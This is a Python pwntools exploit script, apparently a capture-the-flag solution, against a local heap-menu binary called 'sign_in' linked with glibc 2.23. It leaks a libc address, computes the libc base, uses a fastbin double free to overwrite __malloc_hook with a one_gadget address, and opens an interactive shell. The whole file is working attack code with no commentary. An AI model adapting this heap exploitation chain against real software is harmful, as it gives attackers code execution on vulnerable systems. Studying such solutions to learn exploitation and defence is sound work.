from pwn import *
from LibcSearcher import *

elf = ELF("./sign_in")
r = process(["../../libc/ld-2.23_64.so", "./sign_in"],
            env={"LD_PRELOAD": "../../libc/libc-2.23_64.so"})


def add(SIZE, CONTENT):
    r.recvuntil(" : ")
    r.sendline("1")
    r.recvline()
    r.sendline(str(SIZE))
    r.recvline()
    r.sendline(CONTENT)
    r.recvline()
    r.sendline(".")


def view():
    r.recvuntil(" : ")
    r.sendline("2")


def delete(INDEX):
    r.recvuntil(" : ")
    r.sendline("3")
    r.recvline()
    r.sendline(str(INDEX))


add(0xf0, '')  # 0
add(0x20, '')  # 1
delete(1)
delete(0)
add(0xf0, '')  # 2
view()
r.recvuntil(":")
malloc_hook_addr = u64(r.recv(6).ljust(8, '\x00')) + 6
libc = LibcSearcher("__malloc_hook", malloc_hook_addr)
libc_base = malloc_hook_addr - libc.dump("__malloc_hook")
one_gadget_addr = libc_base + 0xf0364
add(0x60, '')  # 3
add(0x60, '')  # 4
delete(3)
delete(4)
delete(3)
add(0x60, p64(malloc_hook_addr - 0x23))  # 5
add(0x60, '')  # 6
add(0x60, '')  # 7
add(0x60, 'a' * 0x13 + p64(one_gadget_addr))  # 8
delete(2)
delete(2)
r.recvline()
r.interactive()
